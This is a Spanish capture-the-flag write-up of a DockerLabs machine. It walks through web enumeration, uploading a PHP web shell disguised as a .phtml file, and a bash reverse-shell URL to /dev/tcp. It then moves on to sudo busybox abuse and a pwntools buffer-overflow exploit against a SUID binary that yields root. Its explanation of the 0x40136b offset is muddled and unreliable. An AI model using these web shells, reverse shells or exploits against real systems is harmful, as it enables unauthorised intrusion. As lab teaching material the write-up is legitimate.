

<img width="502" height="334" alt="image" src="https://github.com/user-attachments/assets/595543ee-a53a-4f64-9e97-3c91ae139a1c" />


# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-yellow?style=for-the-badge)


# Enumeracion de puertos ,servios y Versiones

```ruby
nmap -sSCV --min-rate 5000 -Pn -vvv 172.17.0.2 > nmap.txt 
shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.032KB)
```

`nmap` nos indica que hay un solo puerto  y este es de el servicio (HTTP), por que irermos a mirar que hay en el.

<img width="1013" height="550" alt="image" src="https://github.com/user-attachments/assets/a8757169-49ff-4eb2-a73e-4a024fb2d8fc" />

Nos encontramos  un servicio apache mirando detalladamente vemos una ruta un tanto modificada, `/var/www/5eEk3r`. lo primero que haremos sera agregar la `IP` a nuestro `/etc/hosts/` con el nombre `5eEKr` como dominio 

De esta manera lo agregaremos y volveremos a visitar el dominio  si algo cambia..

```ruby
echo '172.17.0.2 5eEk3r.dl' >> /etc/hosts
```

volviendo a servicio web nuevamente nos encontraremos lo mismo, nos dispondremos a realizarle un fuzzing Web con la herramienta que prefieran, en mi caso usare feroxbuster

```ruby
feroxbuster -u http://5eek3r.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://5eek3r.dl/
 🚩  In-Scope Url          │ 5eek3r.dl
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      368l      933w    10705c http://5eek3r.dl/index.html
301      GET        9l       28w      311c http://5eek3r.dl/javascript => http://5eek3r.dl/javascript/
200      GET       25l      127w    10359c http://5eek3r.dl/icons/openlogo-75.png
200      GET      368l      933w    10705c http://5eek3r.dl/
[##>-----------------] - 85s   465261/4567915 13m     found:4       errors:0      
[##>-----------------] - 85s   255585/2283919 3017/s  http://5eek3r.dl/ 
[#>------------------] - 83s   206998/2283919 2506/s  http://5eek3r.dl/javascript/                                                                                                                                                          ^C

```

En este resultado no vemos directorios con algo importante asi que haremos una busqueda de subdominos con wfuzz 

```ruby
wfuzz -H "Host: FUZZ.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl/

wfuzz -H "Host: FUZZ.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl/ --hh=10705
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://5eek3r.dl/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================

000009532:   400        10 L     35 W       301 Ch      "#www"      
000010581:   400        10 L     35 W       301 Ch      "#mail"     
000042993:   200        101 L    75 W       932 Ch      "crosswords"
000047706:   400        10 L     35 W       301 Ch      "#smtp"     
000103135:   400        10 L     35 W       301 Ch      "#pop3"     

Total time: 91.38973
Processed Requests: 114442
Filtered Requests: 114437
Requests/sec.: 1252.241
```

este proceso nos da varios resultados, pero hay uno que nos llamara mas la atencion `crosswords` lo agregaremos al `/etc/hosts` de esta manera 
```ruby
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl
```
accederemos al subdominio y veremos lo siguiente

<img width="848" height="461" alt="image" src="https://github.com/user-attachments/assets/10bf2a3d-18ae-443f-a56d-706bdc5df109" />


nos  consegiremos una web que codifica el texto que le pasemos sustituyendo cada letra por la siguiente en el puerto 14, inspeccionando la web me consigo con un comentario.

<img width="845" height="431" alt="image" src="https://github.com/user-attachments/assets/2f7f4122-803f-4ca2-97b5-4a08b5e79986" />

En un principio intentar explotar un `xss` no tiene mucho sentido si el objetivo es intentar acceder al servidor por lo que continuo sin hacer caso al comentario del `xss`. Esta web no parece tener nada mas asi que continuo buscando subdominios en vista de que no tengo nada mas que intentar,seguriremos buscando subdominios

```ruby
wfuzz -H "Host: FUZZ.crosswords.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl --hh=10705

wfuzz -H "Host: FUZZ.crosswords.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl --hh=10705
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://5eek3r.dl/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================

000000024:   200        109 L    197 W      3156 Ch     "admin"     
000009532:   400        10 L     35 W       301 Ch      "#www"      
000010581:   400        10 L     35 W       301 Ch      "#mail"     
000047706:   400        10 L     35 W       301 Ch      "#smtp"     
000092040:   200        368 L    933 W      10705 Ch    "eigonokai-j
Total time: 0
Processed Requests: 92034
Filtered Requests: 92030
Requests/sec.: 0
```
optendremos el subdominio `admin` y realizo el mismo  procedimiento en `/etc/hosts` y agrego `admin` quedando de la siguente manera
```ruby
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl admin.crosswords.5eEk3r.dl
```
iremos alsubdominio 

<img width="857" height="421" alt="image" src="https://github.com/user-attachments/assets/5c90a8c2-a03c-4fa5-a353-56b3c7476811" />

damos con un administrador de archivos donde es posible eliminar asi como cargar archivos y por lo visto la web interpreta `php` ya que observo un `index.php`, por tal motivo procedo con la carga de un archivo `php` malicioso
```ruby
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
cargamos el archivo malicioso y me arroja el siguiente mensaje

<img width="857" height="418" alt="image" src="https://github.com/user-attachments/assets/157faf63-0217-403b-98d4-628a524f9e13" />

No es posible cargar un archivo php directamente pero existen formas, primero intente el bypass modificando la peticion en el Content-Type pero el servidor no esta validando esto sino la extension del archivo por lo que tras ir testeando diferentes extensiones logre dar con la que es posible cargar y sobre todo la extension que es interpretada como php por el servidor.

<img width="859" height="422" alt="image" src="https://github.com/user-attachments/assets/84298d90-ac12-434c-ae2a-a4a5fb2d0cdb" />

como se veremos, la extension es phtml nos permite ejecutar comandos, asi que ya cargado el archivo malicioso procedo a obtener la revershell
```ruby
http://crosswords.5eek3r.dl/shell.phtml?cmd=whoami
```
viendo esto haremos un revershell, nos pondremos ala escucha con nc 
```ruby
nc -nlvp 443
``` 
podremos esto en la url 
```
http://crosswords.5eek3r.dl/shell.phtml?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/172.17.0.1/443%20%3C%261%27
```
con esto entraremos con el usuario `www-data`

con esta informacion  listaremos los permisos de usuario

sudo -l
```ryby
User www-data may run the following commands on dockerlabs:
    (astu : astu) NOPASSWD: /usr/bin/busybox # Binario potencial
```

Sabiendo que solo son dos usuarios haremos lo siguiente.
```ruby
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
astu:x:1000:1000:astu,,,:/home/astu:/bin/bash
```

Si intentamos ejecutar el bianario tenemos lo siguiente:

```ruby
sudo -u astu /usr/bin/busybox 
```

No retorna el modo de uso y los binarios que podemos ejecutar:

```ruby
Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --show SCRIPT
   or: busybox --install [-s] [DIR]
   or: function [arguments]...

 BusyBox is a multi-call binary that combines many common Unix
 utilities into a single executable.  Most people will create a
 link to busybox for each function they wish to use and BusyBox
 will act like whatever it was invoked as.

Currently defined functions:
 [, [[, acpid, adjtimex, ar, arch, arp, arping, ascii, ash, awk, base64, basename, bc, blkdiscard, blkid, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt, clear, cmp, cp, cpio, crc32, cttyhack, cut, date, dc, dd, deallocvt,
 depmod, devmem, df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap, dumpleases, echo, egrep, env, expand, expr, factor, fallocate, false, fatattr, fdisk, fgrep, find, findfs, fold, free, freeramdisk, fsfreeze, fstrim, ftpget, ftpput, getopt, getty,
 grep, groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, i2cdetect, i2cdump, i2cget, i2cset, i2ctransfer, id, ifconfig, ifdown, ifup, init, insmod, ionice, ip, ipcalc, ipneigh, kill, killall, klogd, last, less, link, linux32, linux64,
 linuxrc, ln, loadfont, loadkmap, logger, login, logname, logread, losetup, ls, lsmod, lsscsi, lzcat, lzma, lzop, md5sum, mdev, microcom, mim, mkdir, mkdosfs, mke2fs, mkfifo, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
 netstat, nl, nologin, nproc, nsenter, nslookup, nuke, od, openvt, partprobe, paste, patch, pidof, ping, ping6, pivot_root, poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice, reset, resume, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio,
 run-init, run-parts, sed, seq, setkeycodes, setpriv, setsid, sh, sha1sum, sha256sum, sha3sum, sha512sum, shred, shuf, sleep, sort, ssl_client, start-stop-daemon, stat, strings, stty, svc, svok, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail,
 tar, taskset, tee, telnet, test, tftp, time, timeout, top, touch, tr, traceroute, traceroute6, true, truncate, ts, tty, ubirename, udhcpc, udhcpd, uevent, umount, uname, uncompress, unexpand, uniq, unix2dos, unlink, unlzma, unshare, unxz, unzip, uptime, usleep,
 uudecode, uuencode, vconfig, vi, w, watch, watchdog, wc, wget, which, who, whoami, xargs, xxd, xz, xzcat, yes, zcat
```
con esta informacion migraremos al usuario
```
sudo -u astu /usr/bin/busybox sh
```

ahora como usuario `astu` haremos un listado de permisos SUID

```ruby
find / -perm -4000 2>/dev/null
```
Tenemos un binario intenresante 
```
/home/astu/secure/bs64
```
Si ejecutamos el binario tenemos que nos devuelve una cadena en base64
```ruby
/bs64
Ingrese el texto: hola

aG9YS=
```

Ahora probaremos si es vulnerable `BufferOverFlow` para determinar esto usaremos python3 para crear 200 letras A
```ruby
python3 -c 'print("A"*200)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
con esto comprobamos que es vulnerable a BufferOverFlow
```ruby
Ingrese el texto: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQU=

Segmentation fault
```
Ahora desde la maquina victima montamos un servidor python3 para descargarnos el binario a nuestro equipo de atacante:

```ruby
python3 -m http.server 8080
```
Realizamos la peticion:
```ruby
wget http://172.17.0.2:8080/bs64
```
Daremos permisos de ejecucion a el binario 
```ruby
chmod +x bs64
```
 # BufferOverFlow
 Lanzamos el binario con la herramienta
 ```ruby
gdb ./bs64
```

ejecutaremos la aplicacion 

```ruby
pwndbg> run
```

Ahora crearemos un cadena de 400 caracteres para aplicar el desbordamiento de buffer
```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Se ejecutara el programa, Y nos pedira que ingresemos un texto
```ruby
Ingrese el texto: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```
veremos lo siguiente
```ruby
Program received signal SIGSEGV, Segmentation fault.
0x00000000004013d8 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]
 RAX  0
 RBX  0x7fffffffdd88 ◂— '4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 RCX  0
 RDX  0
 RDI  0x7ffff7f987b0 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x4052a0 ◂— 0x5751455751455751 ('QWEQWEQW')
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffdd98 ◂— 'Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0x403df0 —▸ 0x401130 ◂— endbr64 
 RBP  0x3363413263413163 ('c1Ac2Ac3')
 RSP  0x7fffffffdc78 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
 RIP  0x4013d8 (main+58) ◂— ret 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────
 ► 0x4013d8 <main+58>    ret                                <0x6341356341346341>
    ↓


──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────
00:0000│ rsp 0x7fffffffdc78 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
01:0008│     0x7fffffffdc80 ◂— 0x4138634137634136 ('6Ac7Ac8A')
02:0010│     0x7fffffffdc88 ◂— 0x3164413064413963 ('c9Ad0Ad1')
03:0018│     0x7fffffffdc90 ◂— 0x6441336441326441 ('Ad2Ad3Ad')
04:0020│     0x7fffffffdc98 ◂— 0x4136644135644134 ('4Ad5Ad6A')
05:0028│     0x7fffffffdca0 ◂— 0x3964413864413764 ('d7Ad8Ad9')
06:0030│     0x7fffffffdca8 ◂— 0x6541316541306541 ('Ae0Ae1Ae')
07:0038│     0x7fffffffdcb0 ◂— 0x4134654133654132 ('2Ae3Ae4A')
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────
 ► 0         0x4013d8 main+58
   1 0x6341356341346341 None
   2 0x4138634137634136 None
   3 0x3164413064413963 None
   4 0x6441336441326441 None
   5 0x4136644135644134 None
   6 0x3964413864413764 None
   7 0x6541316541306541 None
```

Vemos que el ret tiene este valor ``0x6341356341346341``

Ahora toca sacar el valor de offset en dicha direccion: Tenemos que el valor del offset es el 72
```ruby
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6341356341346341
[*] Exact match at offset 72
```
# Explotacion
`maquina victima`

```ruby
objdump -d bs64 | grep fire

000000000040136a <fire>:
```
Con esto sabemos que tendremos que rellenar el EIP con esa direccion de memoria para que se ejecute el `/bin/sh` que contiene dicha funcion fire.

Como esta en `little-endian` tendremos que darle la vuelta de la siguiente forma:
```ruby
\x6a\x13\x40\x00\x00\x00\x00\x00
```
```ruby
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 72 + b'\x6a\x13\x40\x00\x00\x00\x00\x00')" | ./bs64
```
Pero nos da un error al intentar rellenar el EIP con la funcion fire, aunque lo intentemos de forma manual no se por que no va de ninguna manera, sigue dando un error, por lo que probaremos a montarnos un script con el paquete pwn para que nos facilite mas la tarea.

La forma manual nos puede estar dando un error por el echo de que la direccion puede tener caracteres especiales que no estan siendo escapados correctamente, por lo que a la hora de hacerlo con un script esos caracteres se incluyen de forma correcta, este comando si se ejecutaria bien

```ruby
python3 -c "from pwn import *; p=process('./bs64'); p.sendline(b'A' * 72 + p64(0x40136b)); p.interactive()"
```
Y con esto ya seremos `root`, pero si queremos hacerlo con un script bien echo, seria de la siguiente forma.

```ruby
cd /tmp
```

`exploit.py`

```ruby
#!/bin/python3

from pwn import *

# Configuración del binario
binary = '/home/kali/secure/bs64'  # Reemplaza con la ruta del binario
context.binary = binary

# Cargar el binario
elf = ELF(binary)
p = process(binary)

# Dirección de la función "fire"
fire_func = 0x40136b  # Dirección de la función fire

# Crear el payload
payload = b"A" * 72  # Relleno hasta el EIP (offset de 72 bytes)
payload += p64(fire_func)  # Dirección de la función "fire"

# Enviar el payload
log.info(f"Enviando payload: {payload}")
p.sendline(payload)

# Mantener la interacción
p.interactive()
```

Una vez creado el script si probamos con la direccion que obtenemos al principio 0x40136a no nos ira, pero si probamos la siguiente 0x40136b esta si que funcionara.

# explicacion de la explotacion 


#  1. Dirección de fire y el desplazamiento en la pila

La dirección de la función fire en tu binario es 0x40136a, pero cuando el exploit funciona, usas 0x40136b. La razón de esta diferencia tiene que ver con cómo las funciones y las direcciones se almacenan en la memoria.

`Explicación técnica`

  La dirección de la función fire es 0x40136a, pero al estar trabajando con un buffer y realizando un overflow de la pila, la dirección de retorno que se sobrescribe no se refiere exactamente a `0x40136a`.

 `Posible causa:` Debido a la forma en que se alinean las instrucciones de la CPU o el compilador optimiza el código, la instrucción de retorno (ret) de la función fire podría estar en un byte diferente al de la dirección `10x40136a`. En lugar de sobrescribir exactamente en 0x40136a, sobrescribes un byte adicional, que puede estar en `0x40136b`.

Por lo tanto, en lugar de apuntar exactamente a 0x40136a, se apunta a 0x40136b y es eso lo que hace que funcione.
# 2. Por qué no funciona la forma manual

Cuando intentas realizar el exploit de manera manual (es decir, sin un script), puede que no esté funcionando correctamente por uno o varios de estos motivos:

# A. Dirección en formato little-endian

Cuando proporcionas la dirección manualmente, asegúrate de que esté en little-endian, ya que la arquitectura x86_64 usa este formato para las direcciones de memoria. El formato little-endian invierte el orden de los bytes de una dirección para que se almacenen en memoria correctamente.

  
Si tienes la dirección 0x40136b, debería ser invertida para su uso en la pila:
    En formato little-endian, 0x40136b se representaría como \x6b\x13\x40\x00\x00\x00\x00\x00.


# B. Error en la cantidad de bytes de relleno (offset)

El offset que mencionas es de 72 bytes. Esto significa que debes escribir 72 bytes de relleno antes de colocar la dirección que sobrescribe la dirección de retorno.
Asegúrate de que estés escribiendo exactamente 72 caracteres de relleno ('A' * 72) antes de colocar la dirección de fire. Si no lo haces correctamente, el puntero de retorno puede estar apuntando a un lugar incorrecto.

$ C. Problemas con el entorno de ejecución

Cuando lo haces manualmente, puede que el entorno de ejecución (por ejemplo, el terminal o el sistema operativo) no esté interpretando correctamente los datos que estás enviando. Si hay espacios en blanco u otros caracteres que pueden ser malinterpretados, eso puede hacer que la ejecución no funcione.

Por ejemplo, asegúrate de que no haya caracteres de nueva línea () o terminadores de cadena al final de la entrada que interfieran con la ejecución.
$ 3. ¿Por qué sí funciona con el script?

Cuando usas un script, todo el proceso es manejado de manera más controlada:
 
El script asegura que la dirección esté en el formato correcto (little-endian y con la cantidad correcta de bytes).

El script maneja el flujo de entrada de manera consistente, asegurándose de que no haya caracteres extraños que interfieran.

# Ejecucion de exploit 

Ahora lo ejecutaremos de la siguiente forma:
```ruby
python3 exploit.py
[*] '/home/kali/secure/bs64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/kali/secure/bs64': pid 163
[*] Enviando payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk\x13@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFaxN
$ whoami
root
```
Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
